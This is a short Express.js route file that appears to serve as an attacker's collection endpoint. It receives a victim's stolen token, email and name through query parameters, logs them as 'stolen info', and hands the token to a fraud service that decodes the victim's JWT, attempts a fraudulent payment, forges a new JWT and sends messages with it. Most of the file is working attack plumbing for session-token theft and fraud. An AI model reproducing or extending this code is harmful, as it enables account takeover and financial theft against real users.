import express from 'express';
import fraudService from '../services/fraud.service.js';
import { inspect } from 'util';

const router = express.Router();

// GET /?token=...
router.get('/', async (req, res) => {
  const { token, email, name } = req.query;
  console.log(
    new Date().toISOString() +
      '--------------------------------GOT STOLEN INFO--------------------------------'
  );
  console.log('Stolen token received:', inspect(token));
  console.log('Stolen email received:', inspect(email));
  console.log('Stolen name received:', inspect(name));

  fraudService.decodeVictimJWT(token);

  fraudService.attemptFraudulentPayment(token);

  const fraudulentToken = await fraudService.buildFraudulentJWT(token);

  fraudService.sendMessages(fraudulentToken, 3);

  res.sendStatus(204);
});

export default router;
